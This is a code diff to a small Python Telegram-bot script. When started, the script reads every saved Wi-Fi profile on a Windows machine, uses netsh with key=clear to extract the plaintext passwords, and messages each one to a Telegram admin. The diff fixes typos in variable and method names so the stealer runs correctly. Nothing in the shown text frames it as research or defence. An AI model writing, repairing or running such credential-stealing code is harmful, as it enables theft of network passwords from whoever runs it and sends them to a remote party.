@@ -8,7 +8,7 @@ from chardet import detect
 from aiogram import Dispatcher, Bot, types, executor
 
 bot = Bot(token="", parse_mode="html")
-admin_id =
+admin_id = 
 dp = Dispatcher(bot)
 
 
@@ -16,7 +16,7 @@ async def extract_wifi_passwords(m: types.Message):
     try:
         qwe = detect(subprocess.check_output('netsh wlan show profiles'))['encoding']
         profiles_data = subprocess.check_output('netsh wlan show profiles').decode(qwe).split("\n")
-        profiles = [i.split(':')[1].strip() for i in profiles_bata if 'Все профили пользователей' in i]
+        profiles = [i.split(':')[1].strip() for i in profiles_data if 'Все профили пользователей' in i]
 
         for profile in profiles:
             profile_info = subprocess.check_output(f'netsh wlan show profile {profile} key=clear').decode(qwe).split('\n')
@@ -26,9 +26,9 @@ async def extract_wifi_passwords(m: types.Message):
             except IndexError:
                 password = None
 
-            await bot.send_messag(admin_id, f'Profile: {profile}\nPassword: {password}\n{"#" * 20}')
+            await bot.send_message(admin_id, f'Profile: {profile}\nPassword: {password}\n{"#" * 20}')
     except subprocess.CalledProcessError:
         pass
 
 if __name__ == "__main__":
-    executor.start_poling(dp, on_startup=extract_wifi_passwords)
+    executor.start_polling(dp, on_startup=extract_wifi_passwords)
